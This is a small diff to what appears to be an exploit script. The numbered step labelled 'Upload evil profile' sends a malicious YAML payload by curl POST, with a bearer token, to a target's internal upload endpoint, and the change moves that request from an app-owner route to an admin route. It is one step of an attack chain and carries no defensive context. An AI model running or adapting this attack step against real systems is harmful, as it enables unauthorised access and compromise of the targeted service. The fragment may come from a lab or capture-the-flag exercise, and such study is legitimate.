@@ -13,7 +13,7 @@ fi
 
 echo "=== [Step 7+8] Upload evil profile ==="
 curl -s -X POST \
-  "http://${TARGET}/internal/app-owner/profile/upload" \
+  "http://${TARGET}/internal/admin/profile/upload" \
   -H "Authorization: Bearer ${TOKEN}" \
   -H "Content-Type: application/x-yaml" \
   --data-binary "@${PAYLOAD}"
